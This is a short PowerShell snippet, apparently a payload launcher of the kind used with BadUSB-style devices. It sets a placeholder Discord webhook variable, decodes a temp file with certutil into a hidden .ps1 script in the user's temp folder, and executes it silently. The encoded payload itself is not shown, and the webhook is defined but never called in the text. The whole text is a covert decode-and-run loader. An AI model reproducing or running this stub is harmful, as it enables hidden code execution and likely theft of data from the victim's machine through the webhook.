$webhook = "DiscordWebhook"
$timePosition = "00:00:02"
$TempFile = "$env:TEMP\temp.ps1"; $File = "$env:TEMP\l.ps1"; echo  > "$TempFile"; certutil -f -decode "$TempFile" "$File" | out-null; & "$env:TEMP\l.ps1"
